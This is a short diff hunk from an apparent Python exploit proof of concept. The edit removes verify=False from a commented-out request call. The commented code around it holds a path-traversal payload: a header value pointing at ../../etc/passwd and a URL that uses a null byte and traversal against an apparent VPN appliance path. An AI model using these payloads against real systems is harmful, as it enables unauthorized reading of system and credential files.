@@ -64,7 +64,7 @@ import ssl
 # X_AN_FILESHARE: uname=t; password=t; sp_uname=t; flags=c3248;fshare_template=../../../../../../../../etc/passwd'''
 #     vulurl=url+"/prx/000/http/localhost/client_sec/%00../../../addfolder"
 #     try:
-#         uu = hackRequests().http(vulurl, headers=headers,verify=False)
+#         uu = hackRequests().http(vulurl, headers=headers)
 #         print(uu.text())
 #     except  Exception as e:
 #         print (e)
